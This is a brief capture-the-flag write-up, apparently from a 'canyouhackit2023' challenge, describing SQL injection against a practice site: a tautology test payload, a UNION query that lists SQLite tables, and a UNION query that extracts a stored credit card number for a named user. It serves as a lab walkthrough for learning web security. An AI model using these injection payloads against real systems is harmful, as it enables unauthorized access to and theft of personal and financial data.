We first start by testing the syntax. On the first try I got this payload to print something different:

```
' OR 1=1 --
```

![image](https://github.com/tzwukerf/canyouhackit2023/assets/77770175/e618e4e9-7b1a-4196-a04b-881bee343b53)

After several attempts of different payloads oriented towards different SQL databases (SQL, mySQL, etc) I figured out that it was a sqlite server by trying sqlite injections. This payload returned to me all the tables:

```
' UNION SELECT name FROM sqlite_master WHERE type='table' --
```

![image](https://github.com/tzwukerf/canyouhackit2023/assets/77770175/8c2d9961-4b2b-4233-9fff-8585a4a63b2c)

Using this information, we can craft our payload:

'''
' UNION SELECT card FROM credit_cards WHERE username="scruffy" --
'''

It gives us our credit card number and then we can submit it to get another challenge completed.
